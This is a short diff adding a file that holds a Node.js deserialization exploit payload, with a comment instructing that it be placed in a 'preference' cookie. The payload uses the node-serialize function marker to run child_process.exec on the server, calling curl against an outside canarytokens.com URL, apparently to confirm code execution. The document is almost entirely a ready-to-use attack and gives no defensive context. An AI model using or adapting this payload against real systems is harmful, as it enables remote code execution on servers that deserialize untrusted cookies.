@@ -1,0 +1,6 @@
+{"payload":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://canarytokens.com/traffic/amaivhe5ci4zoq9eta7tvnvg7/contact.php', function(error, stdout, stderr){console.log(stdout)})}()"}
+
+
+//save it in preference= cookie value
+
+
